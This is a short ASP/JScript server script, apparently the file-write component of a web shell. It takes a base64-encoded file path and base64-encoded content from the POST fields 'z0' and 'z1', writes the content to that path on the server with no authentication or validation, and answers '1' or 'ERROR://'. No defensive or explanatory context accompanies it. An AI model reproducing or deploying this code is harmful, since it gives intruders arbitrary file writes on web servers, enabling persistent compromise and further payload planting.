<%

function base64Decode(str) {
    if (!str || str == "")
        return "";
    var bytes = System.Convert.FromBase64String(str);

    return System.Text.Encoding.UTF8.GetString(bytes);
}

var szFilePath = base64Decode(Request.Form["z0"]);
var szContent = base64Decode(Request.Form["z1"]);

var fileStream = null;

try {
    fileStream = new System.IO.StreamWriter(szFilePath, false, System.Text.Encoding.UTF8);
    fileStream.Write(szContent);
    fileStream.Close();
    
    Response.Write("1");
}
catch (ex) {
    if (fileStream != null) {
        fileStream.Close();
    }
    
    Response.Write("ERROR://" + ex.Message);
}

%>